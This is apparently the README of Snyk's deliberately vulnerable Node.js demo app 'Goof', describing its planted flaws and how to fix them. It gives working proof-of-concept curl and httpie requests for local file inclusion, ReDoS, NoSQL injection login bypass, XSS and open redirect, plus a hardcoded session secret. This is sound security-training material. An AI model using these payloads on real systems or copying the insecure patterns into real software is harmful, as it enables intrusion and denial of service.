# Goof - Snyk's vulnerable demo app
[![Known Vulnerabilities](https://snyk.io/test/github/snyk/goof/badge.svg?style=flat-square)](https://snyk.io/test/github/snyk/goof)

A vulnerable Node.js demo application, based on the [Dreamers Lab tutorial](http://dreamerslab.com/blog/en/write-a-todo-list-with-express-and-mongodb/).

See [docs/architecture.md](docs/architecture.md) for the architecture diagram, the route-by-route map of planted vulnerabilities, and the build and CI setup.

## Features

This vulnerable app includes the following capabilities to experiment with:
* [Exploitable packages](#exploiting-the-vulnerabilities) with known vulnerabilities
* [Docker Image Scanning](#docker-image-scanning) for base images with known vulnerabilities in system libraries

## Running
Requires Node.js 17 or newer (the npm scripts pass `--openssl-legacy-provider`; the Dockerfile uses Node.js 18).

```bash
mongod &

git clone https://github.com/COG-GTM/nodejs-goof
cd nodejs-goof
npm install
npm start
```
This will run Goof locally, using a local mongo on the default port and listening on port 3001 (http://localhost:3001). Set `PORT` to change the port, or `MONGODB_URI` to use another MongoDB server (for example `MONGODB_URI=mongodb://localhost:27018/express-todo`).

Note: You *have* to use an old version of MongoDB version due to some of these old libraries' database server APIs. MongoDB 3 is known to work ok.

You can also run the MongoDB server individually via Docker, such as:

```sh
docker run --rm -p 27017:27017 mongo:3
```

The `/users` routes also need MySQL on `localhost:3306` with user `root`, password `root` and a database named `acme` (hard-coded in `typeorm-db.js`). Without it the app still starts, logs a MySQL connection error, and only `/users` fails:

```sh
docker run --rm -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=acme mysql:5
```

## Running with docker-compose
```bash
docker-compose up --build
docker-compose down
```
This starts the app with `mongo:3` and `mysql:5`. The app reaches MongoDB as `goof-mongo`, but `typeorm-db.js` connects to MySQL on `localhost`, so `/users` does not work inside Compose.

### Heroku usage
Goof requires attaching a MongoLab service to be deployed as a Heroku app. 
That sets up the MONGOLAB_URI env var so everything after should just work (`MONGODB_URI` is also read). See [deploy-heroku.md](deploy-heroku.md).

### CloudFoundry usage
Goof requires attaching a MongoLab service and naming it "goof-mongo" to be deployed on CloudFoundry. 
The code explicitly looks for credentials to that service. 

### Cleanup
To bulk delete the current list of TODO items from the local DB run (needs the legacy `mongo` shell on your `PATH`):
```bash
npm run cleanup
```

### Tests
`npm test` runs `snyk test` and needs a Snyk login (`snyk auth`) or `SNYK_TOKEN`. It reports the vulnerable dependencies and exits non-zero by design.

## Exploiting the vulnerabilities

This app uses npm dependencies holding known vulnerabilities,
as well as insecure code that introduces code-level vulnerabilities.

The `exploits/` directory includes a series of steps to demonstrate each one.

### Vulnerabilities in open source dependencies

Here are the exploitable vulnerable packages:
- [Mongoose - Buffer Memory Exposure](https://snyk.io/vuln/npm:mongoose:20160116) - requires a version <= Node.js 8. For the exploit demo purposes, one can update the Dockerfile `node` base image to use `FROM node:6-stretch`.
- [st - Directory Traversal](https://snyk.io/vuln/npm:st:20140206)
- [ms - ReDoS](https://snyk.io/vuln/npm:ms:20151024)
- [marked - XSS](https://snyk.io/vuln/npm:marked:20150520)

### Vulnerabilities in code

* Open Redirect
* NoSQL Injection
* Code Injection
* Command execution
* Cross-site Scripting (XSS)
* Information exposure via Hardcoded values in code
* Security misconfiguration exposes server information 
* Insecure protocol (HTTP) communication 
* Zip Slip (archive path traversal) in `/import`
* Prototype pollution in `/chat` and `/users`
* Server-side template injection (Dust) in `/about_new`

[docs/architecture.md](docs/architecture.md#routes-and-planted-vulnerabilities) maps each route to its vulnerability and exploit script.

#### Code injection

The page at `/account_details` is rendered as an Handlebars view.

The same view is used for both the GET request which shows the account details, as well as the form itself for a POST request which updates the account details. A so-called Server-side Rendering.

The form is completely functional. The way it works is, it receives the profile information from the `req.body` and passes it, as-is to the template. This however means, that the attacker is able to control a variable that flows directly from the request into the view template library.

You'd think that what's the worst that can happen because we use a validation to confirm the expected input, however the validation doesn't take into account a new field that can be added to the object, such as `layout`, which when passed to a template language, could lead to Local File Inclusion (Path Traversal) vulnerabilities. Here is a proof-of-concept showing it:

```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@snyk.io", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
```

```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
```

Actually, there's even another vulnerability in this code.
The `validator` library that we use has several known regular expression denial of service vulnerabilities. One of them, is associated with the email regex, which if validated with the `{allow_display_name: true}` option then we can trigger a denial of service for this route:

```sh
curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"`seq -s "" -f "<" 100000`\"}" 'http://localhost:3001/account_details'
```

The `validator.rtrim()` sanitizer is also vulnerable, and we can use this to create a similar denial of service attack:

```sh
curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"someone@example.com\", \"country\": \"nop\", \"phone\": \"0501234123\", \"lastname\": \"nop\", \"firstname\": \"`node -e 'console.log(" ".repeat(100000) + "!")'`\"}" 'http://localhost:3001/account_details'
```

#### NoSQL injection

A POST request to `/login` will allow for authentication and signing-in to the system as an administrator user.
It works by exposing `loginHandler` as a controller in `routes/index.js` and uses a MongoDB database and the `User.find()` query to look up the user's details (email as a username and password). One issue is that it indeed stores passwords in plaintext and not hashing them. However, there are other issues in play here.


We can send a request with an incorrect password to see that we get a failed attempt
```sh
echo '{"username":"admin@snyk.io", "password":"WrongPassword"}' | http --json $GOOF_HOST/login -v
```

And another request, as denoted with the following JSON request to sign-in as the admin user works as expected:
```sh
echo '{"username":"admin@snyk.io", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/login -v
```

However, what if the password wasn't a string? what if it was an object? Why would an object be harmful or even considered an issue?
Consider the following request:
```sh
echo '{"username": "admin@snyk.io", "password": {"$gt": ""}}' | http --json $GOOF_HOST/login -v
```

We know the username, and we pass on what seems to be an object of some sort.
That object structure is passed as-is to the `password` property and has a specific meaning to MongoDB - it uses the `$gt` operation which stands for `greater than`. So, we in essence tell MongoDB to match that username with any record that has a password that is greater than `empty string` which is bound to hit a record. This introduces the NoSQL Injection vector.

#### Open redirect

The `/admin` view introduces a `redirectPage` query path, as follows in the admin view:

```
<input type="hidden" name="redirectPage" value="<%- redirectPage %>" />
```

One fault here is that the `redirectPage` is rendered as raw HTML and not properly escaped, because it uses `<%- >` instead of `<%= >`. That itself, introduces a Cross-site Scripting (XSS) vulnerability via:

```
http://localhost:3001/login?redirectPage="><script>alert(1)</script>
```

To exploit the open redirect, simply provide a URL such as `redirectPage=https://google.com` which exploits the fact that the code doesn't enforce local URLs in `routes/index.js:61`.

#### Hardcoded values - session information

The application initializes a cookie-based session on `app.js:42` as follows:

```js
app.use(session({
  secret: 'keyboard cat',
  name: 'connect.sid',
  cookie: { path: '/' }
}))
```

As you can see, the session `secret` used to sign the session is a hardcoded sensitive information inside the code.

First attempt to fix it, can be to move it out to a config file such as:
```js
module.exports = {
    cookieSecret: `keyboard cat`
}
```

And then require the configuration file and use it to initialize the session.
However, that still maintains the secret information inside another file, and Snyk Code will warn you about it.

Another case we can discuss here in session management, is that the cookie options only set `path`. There's no `secure: true`, so the session cookie is also sent over plain HTTP connections. Snyk Code highlights this potential security misconfiguration so we can fix it. We can note that Snyk Code shows this as a quality information, and not as a security error.

`app.js` also hard-codes a `SECRET_TOKEN_...` value and prints it to the console at startup.

Snyk Code will also find hardcoded secrets in source code that isn't part of the application logic, such as `tests/` or `examples/` folders. We have a case of that in this application with the `tests/authentication.component.spec.js` file. In the finding, Snyk Code will tag it as `InTest`, `Tests`, or `Mock`, which help us easily triage it and indeed ignore this finding as it isn't actually a case of information exposure.

## Docker Image Scanning

The `Dockerfile` builds on `node:18.13.0`, an old Node.js image whose system libraries have known vulnerabilities (the older `node:6-stretch` base is left commented out in the file).

To scan the image for vulnerabilities, run:
```bash
snyk container test node:18.13.0 --file=Dockerfile
```

To monitor this image and receive alerts with Snyk:
```bash
snyk container monitor node:18.13.0
```

## Runtime Alerts

Earlier versions of Goof loaded the Snyk runtime agent from `app.js`. The code on `main` no longer includes it, and `SNYK_PROJECT_ID` is not read.

## Fixing the issues
To find these flaws in this application (and in your own apps), run:
```
npm install
npx snyk wizard
```

`snyk wizard` exists only in older Snyk CLIs such as the version in this repo's `devDependencies`; with a current global CLI, use `snyk test` and upgrade the reported packages. In this application, the default `snyk wizard` answers will fix all the issues.
When the wizard is done, restart the application and run the exploits again to confirm they are fixed.
